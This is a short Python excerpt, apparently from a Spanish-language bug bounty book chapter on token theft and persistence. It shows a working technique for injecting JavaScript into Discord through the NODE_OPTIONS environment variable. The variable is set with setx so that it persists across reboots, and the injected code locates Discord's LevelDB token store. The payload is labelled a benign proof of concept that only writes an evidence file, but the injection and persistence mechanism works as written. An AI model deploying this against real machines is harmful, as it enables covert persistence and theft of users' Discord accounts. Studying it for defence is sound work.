# Extraído de: LibroBugBounty/cap-15-token-theft-persistencia.md
import subprocess
from pathlib import Path

def inject_via_node_options(payload_path):
    """Inyecta código en Discord via NODE_OPTIONS.
    No modifica ningún fichero de Discord."""
    # Crear payload JavaScript
    payload = Path(payload_path)
    payload.write_text("""
    // Payload inyectado via NODE_OPTIONS
    const fs = require('fs');
    const os = require('os');
    const path = require('path');

    // Exfiltrar token de Discord
    const leveldb_dir = path.join(
        os.homedir(), 'AppData', 'Roaming',
        'discord', 'Local Storage', 'leveldb'
    );

    // Escribir evidencia (PoC benigno)
    const proof = path.join(
        'C:', 'Users', 'Public', 'node_options_proof.txt'
    );
    fs.writeFileSync(proof, [
        'NODE_OPTIONS injection successful',
        'PID: ' + process.pid,
        'Time: ' + new Date().toISOString(),
        'LevelDB dir exists: ' + fs.existsSync(leveldb_dir),
    ].join('\\n'));
    """)

    # Establecer variable de entorno de usuario (persiste entre reinicios)
    subprocess.run([
        "setx", "NODE_OPTIONS",
        f'--require={payload_path}'
    ], capture_output=True)

    return True
